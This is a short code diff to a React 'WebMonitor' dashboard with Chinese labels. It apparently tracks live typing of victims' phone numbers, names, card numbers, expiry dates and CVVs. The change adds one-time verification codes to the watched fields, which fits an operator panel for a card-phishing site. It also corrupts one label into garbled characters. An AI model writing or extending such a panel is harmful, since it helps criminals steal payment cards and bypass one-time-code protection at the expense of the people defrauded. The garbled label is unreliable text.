@@ -302,7 +302,7 @@ export function WebMonitor() {
           
           <div className="flex items-center gap-2">
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
-              🌐 站点管理
+              🌐 站���管理
             </Button>
             <Button variant="ghost" size="sm" className="text-muted-foreground hover:text-foreground">
               📊 实时统计
@@ -436,7 +436,7 @@ export function WebMonitor() {
                 );
 
                 // 检查是否有字段正在输入
-                const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv'].some(field =>
+                const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv', 'verificationCode'].some(field =>
                   isFieldTyping(submission.id, field)
                 );
 
